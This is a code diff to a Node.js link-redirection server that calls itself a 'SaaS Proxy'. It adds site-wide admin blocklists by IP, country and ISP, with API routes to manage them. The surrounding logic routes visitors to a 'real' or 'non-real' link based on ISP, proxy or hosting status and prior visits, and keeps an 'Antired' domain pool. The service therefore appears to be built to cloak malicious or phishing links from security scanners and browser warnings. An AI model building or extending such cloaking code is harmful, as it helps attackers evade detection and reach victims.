@@ -1056,7 +1056,7 @@ async function handleRedirection(user, req, res, linkData) {
     if (!user.isActive) {
         return res.status(403).send('Account Suspended or Inactive');
     }
-    
+
     // Check specific link expiry
     const linkExpiry = linkData.expiryDate || user.expiryDate;
     if (!linkExpiry || new Date(linkExpiry) < new Date()) {
@@ -1064,8 +1064,24 @@ async function handleRedirection(user, req, res, linkData) {
     }
 
     const { settings, forcedIps, blockedIps, visitedIps } = user;
-    const clientIp = req.ip;
+    const clientIp = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
+    const countryHeader = getClientCountry(req);
+
+    // Pull the admin-level blocklist snapshot (cached briefly to limit file IO).
+    const adminBlocks = await getAdminBlocksSnapshot();
+
+    // 0a. Admin IP block (site-wide, highest priority - deny before any other logic).
+    if ((adminBlocks.ips || []).some(b => b.value === clientIp)) {
+        console.warn(`[AdminBlock] IP blocked: ${clientIp} (user=${user.id})`);
+        return res.status(403).send('Access denied by administrator.');
+    }
+
+    // 0b. Admin Country block (header-driven, cheap; applies before paid lookups).
+    if (countryHeader && (adminBlocks.countries || []).some(b => b.value === countryHeader)) {
+        console.warn(`[AdminBlock] Country blocked: ${countryHeader} (ip=${clientIp}, user=${user.id})`);
+        return res.status(403).send('Access denied by administrator.');
+    }
 
     const realLink = linkData.realLink || settings.realLink;
     const nonRealLink = linkData.nonRealLink || settings.nonRealLink;
@@ -1074,7 +1090,7 @@ async function handleRedirection(user, req, res, linkData) {
     const useMobileIsps = linkData.mobileIsps || settings.mobileIsps;
     const useReallowVisited = linkData.reallowVisited !== undefined ? linkData.reallowVisited : settings.reallowVisited;
 
-    // 0. Blocked IP Check (highest priority - deny before any other logic)
+    // 0c. Blocked IP Check (user-level - deny before any other logic)
     if ((blockedIps || []).includes(clientIp)) {
         return res.status(403).send('Access denied. Your IP has been blocked by the operator.');
     }
@@ -1097,10 +1113,20 @@ async function handleRedirection(user, req, res, linkData) {
     // 3. IP Analysis
     let data = null;
     try {
-        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
+        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query,continentCode`, { timeout: 5000 });
         data = response.data;
     } catch (error) {
         console.error('ISP lookup failed:', error.message);
+    }
+
+    // 3a. Admin ISP block (matches against ISP/org names from geo response).
+    if (data && (adminBlocks.isps || []).length) {
+        const candidates = [data.isp, data.org].filter(Boolean);
+        if (candidates.some(c => ispMatchesAnyBlock(c, adminBlocks.isps))) {
+            const matched = candidates.find(c => ispMatchesAnyBlock(c, adminBlocks.isps));
+            console.warn(`[AdminBlock] ISP blocked: ${matched} (ip=${clientIp}, user=${user.id})`);
+            return res.status(403).send('Access denied by administrator.');
+        }
     }
 
     const isProxy = data && data.proxy === true;
@@ -1282,6 +1308,103 @@ app.post('/api/admin/antired-domains', requireAdmin, asyncHandler(async (req, re
 }));
 
 console.log(`[Antired] Domain pool source: ${getEnvAntiredDomains().length > 0 ? 'ENV (ANTIRED_DOMAINS, ' + getEnvAntiredDomains().length + ' hosts)' : 'admin file'}`);
+
+// --- Admin-level blocklists (IP / ISP / Country) ---
+// Site-wide rules applied to /l/:slug regardless of which user's link was hit.
+
+function isValidIpLiteral(v) {
+    // IPv4 (with optional CIDR) or IPv6 (with optional CIDR). Loose: accept . / : / hex.
+    if (typeof v !== 'string' || !v) return false;
+    if (v.includes('/')) {
+        const [base] = v.split('/');
+        return isValidIpLiteral(base);
+    }
+    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(v)) {
+        return v.split('.').every(o => {
+            const n = Number(o);
+            return n >= 0 && n <= 255;
+        });
+    }
+    // IPv6 (full or partial)
+    if (/^[0-9a-fA-F:]+$/.test(v) && v.includes(':')) return true;
+    return false;
+}
+
+app.get('/api/admin/blocks/:type', requireAdmin, asyncHandler(async (req, res) => {
+    const { type } = req.params;
+    if (!db.VALID_BLOCK_TYPES.has(type)) return res.status(400).json({ error: 'INVALID_TYPE' });
+    const blocks = await db.readAdminBlocks();
+    res.json({ type, items: blocks[type] || [] });
+}));
+
+app.post('/api/admin/blocks/:type', requireAdmin, asyncHandler(async (req, res) => {
+    const { type } = req.params;
+    if (!db.VALID_BLOCK_TYPES.has(type)) return res.status(400).json({ error: 'INVALID_TYPE' });
+    const { value, reason } = req.body || {};
+    const v = typeof value === 'string' ? value.trim() : '';
+    if (!v) return res.status(400).json({ error: 'EMPTY_VALUE' });
+    if (type === 'ips' && !isValidIpLiteral(v)) {
+        return res.status(400).json({ error: 'INVALID_IP_FORMAT' });
+    }
+    if (type === 'countries' && !/^[A-Za-z]{2}$/.test(v)) {
+        return res.status(400).json({ error: 'COUNTRY_CODE_REQUIRED_2_LETTERS' });
+    }
+    if (type === 'isps' && v.length < 2) {
+        return res.status(400).json({ error: 'ISP_VALUE_TOO_SHORT' });
+    }
+    try {
+        const blocks = await db.addAdminBlock(type, v, reason || '');
+        _adminBlocksCache = null;
+        const added = blocks[type][blocks[type].length - 1];
+        res.json({ ok: true, item: added, items: blocks[type] });
+    } catch (err) {
+        if (err.code === 'DUPLICATE_VALUE') return res.status(409).json({ error: 'DUPLICATE_VALUE' });
+        if (err.message === 'EMPTY_VALUE') return res.status(400).json({ error: 'EMPTY_VALUE' });
+        throw err;
+    }
+}));
+
+app.delete('/api/admin/blocks/:type/:id', requireAdmin, asyncHandler(async (req, res) => {
+    const { type, id } = req.params;
+    if (!db.VALID_BLOCK_TYPES.has(type)) return res.status(400).json({ error: 'INVALID_TYPE' });
+    if (!id) return res.status(400).json({ error: 'ID_REQUIRED' });
+    const blocks = await db.removeAdminBlock(type, id);
+    _adminBlocksCache = null;
+    res.json({ ok: true, items: blocks[type] });
+}));
+
+// Pre-compute block verdicts once per visit (cached within request lifetime).
+let _adminBlocksCache = null;
+let _adminBlocksFetchedAt = 0;
+const ADMIN_BLOCKS_CACHE_MS = 2000;
+
+async function getAdminBlocksSnapshot() {
+    const now = Date.now();
+    if (_adminBlocksCache && (now - _adminBlocksFetchedAt) < ADMIN_BLOCKS_CACHE_MS) {
+        return _adminBlocksCache;
+    }
+    const blocks = await db.readAdminBlocks();
+    _adminBlocksCache = blocks;
+    _adminBlocksFetchedAt = now;
+    return blocks;
+}
+
+function ispMatchesAnyBlock(ispValue, blockedIsps) {
+    if (!ispValue || !blockedIsps || !blockedIsps.length) return false;
+    const v = String(ispValue).toUpperCase();
+    return blockedIsps.some(b => v.includes(String(b).toUpperCase()));
+}
+
+function blockedByAdmin(ip, countryHdr, geoData, blocks) {
+    if (!blocks) return null;
+    if ((blocks.ips || []).some(b => b.value === ip)) return 'IP';
+    if (countryHdr && (blocks.countries || []).some(b => b.value === countryHdr.toUpperCase())) return 'COUNTRY';
+    if (geoData) {
+        const candidates = [geoData.isp, geoData.org].filter(Boolean);
+        if (candidates.some(c => ispMatchesAnyBlock(c, blocks.isps))) return 'ISP';
+    }
+    return null;
+}
 
 app.listen(port, () => {
     console.log(`SaaS Proxy server running on port ${port}`);
